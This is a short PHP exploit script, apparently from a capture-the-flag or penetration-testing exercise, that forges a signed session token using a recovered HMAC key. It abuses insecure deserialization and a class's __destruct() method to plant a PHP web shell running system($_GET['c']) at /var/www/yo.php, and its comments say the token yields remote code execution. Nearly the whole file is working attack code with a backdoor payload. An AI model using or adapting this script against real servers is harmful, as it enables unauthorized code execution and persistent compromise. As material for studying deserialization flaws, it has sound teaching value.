<?php  

//After exploiting another vulnerability, i was able to recover the source code of the API which showed that the API deserilizes the session token in order to indentify the user.
// The code also that the class File uses the trompoline  function __destruct() to write the variable $uuid in the file $logfile 
// This is the script i used for exploiting the insecure deserialization in PHP.


define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza"); 
function sign($data) {   return hash_hmac('md5', $data, KEY); }

function tokenize($user) 
 {     $token = urlencode(base64_encode(serialize($user)));      
 	   $token.= "--".sign($token);    
 	   return $token;   }  

class File
{
     public $uuid='<?php system($_GET["c"]); ?>';
     public $logfile = "/var/www/yo.php";
	
}

echo tokenize(new File());

// Now, we can use the generated value as the sesion token to get RCE.

?>
